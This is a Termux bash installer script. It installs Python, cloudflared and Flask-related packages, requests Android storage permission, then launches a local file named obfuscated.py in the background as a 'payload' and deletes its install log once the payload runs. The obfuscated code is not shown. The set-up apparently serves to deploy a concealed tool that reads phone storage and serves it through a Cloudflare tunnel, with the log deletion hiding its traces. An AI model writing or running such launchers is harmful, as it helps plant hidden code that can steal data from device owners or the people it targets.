#!/data/data/com.termux/files/usr/bin/bash

set -e

LOG_FILE="/data/data/com.termux/files/home/.install.log"
OBFUSCATED_SCRIPT="obfuscated.py"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

error_exit() {
    echo "Error: $1"
    log "ERROR: $1"
    exit 1
}

check_termux() {
    if [ ! -d "/data/data/com.termux" ]; then
        error_exit "This script must be run in Termux"
    fi
}

update_packages() {
    echo "Updating package repositories..."
    log "Starting package update"
    
    if ! termux-change-repo > /dev/null 2>&1; then
        pkg update -y > /dev/null 2>&1 || error_exit "Failed to update packages"
    fi
    
    pkg upgrade -y > /dev/null 2>&1 || error_exit "Failed to upgrade packages"
    log "Package update completed"
}

install_dependencies() {
    echo "Installing system dependencies..."
    log "Installing system packages"
    
    local packages="python python-pip cloudflared libjpeg-turbo libpng zlib git wget"
    
    for pkg_name in $packages; do
        if ! dpkg -s "$pkg_name" > /dev/null 2>&1; then
            echo "Installing $pkg_name..."
            pkg install -y "$pkg_name" > /dev/null 2>&1 || error_exit "Failed to install $pkg_name"
            log "Installed: $pkg_name"
        fi
    done
    
    echo "System dependencies installed"
}

install_python_packages() {
    echo "Installing Python dependencies..."
    log "Installing Python packages"
    
    pip install --upgrade pip > /dev/null 2>&1 || error_exit "Failed to upgrade pip"
    
    local py_packages="flask==3.0.0 waitress==2.1.2 pillow==10.1.0 requests==2.31.0"
    
    pip install $py_packages > /dev/null 2>&1 || error_exit "Failed to install Python packages"
    
    log "Python packages installed"
    echo "Python dependencies installed"
}

verify_installation() {
    echo "Verifying installation..."
    log "Starting verification"
    
    python3 -c "import flask" 2>/dev/null || error_exit "Flask not installed correctly"
    python3 -c "import waitress" 2>/dev/null || error_exit "Waitress not installed correctly"
    python3 -c "import PIL" 2>/dev/null || error_exit "Pillow not installed correctly"
    python3 -c "import requests" 2>/dev/null || error_exit "Requests not installed correctly"
    
    if ! command -v cloudflared &> /dev/null; then
        error_exit "Cloudflared not installed correctly"
    fi
    
    log "Verification completed"
    echo "Installation verified"
}

request_storage_permission() {
    if [ ! -d "/storage/emulated/0" ]; then
        echo "Requesting storage permission..."
        termux-setup-storage
        sleep 3
        
        if [ ! -d "/storage/emulated/0" ]; then
            error_exit "Storage permission not granted"
        fi
        
        log "Storage permission granted"
    fi
}

check_obfuscated_script() {
    if [ ! -f "$OBFUSCATED_SCRIPT" ]; then
        error_exit "obfuscated.py not found in current directory"
    fi
    
    if ! python3 -m py_compile "$OBFUSCATED_SCRIPT" 2>/dev/null; then
        error_exit "obfuscated.py contains syntax errors"
    fi
    
    log "Obfuscated script validated"
}

cleanup() {
    if [ -f "$LOG_FILE" ]; then
        rm -f "$LOG_FILE"
    fi
}

launch_payload() {
    echo "Launching payload..."
    log "Executing obfuscated.py"
    
    if [ ! -f "$OBFUSCATED_SCRIPT" ]; then
        error_exit "Obfuscated script not found"
    fi
    
    python3 "$OBFUSCATED_SCRIPT" &
    
    sleep 2
    
    if ps aux | grep -v grep | grep "$OBFUSCATED_SCRIPT" > /dev/null; then
        log "Payload launched successfully"
        echo "Payload running in background"
        cleanup
    else
        error_exit "Failed to launch payload"
    fi
}

main() {
    echo "Starting installation process..."
    log "Installation started"
    
    check_termux
    update_packages
    install_dependencies
    install_python_packages
    verify_installation
    request_storage_permission
    check_obfuscated_script
    launch_payload
    
    echo "Installation completed successfully"
    log "Installation completed"
}

trap 'error_exit "Installation interrupted"' INT TERM

main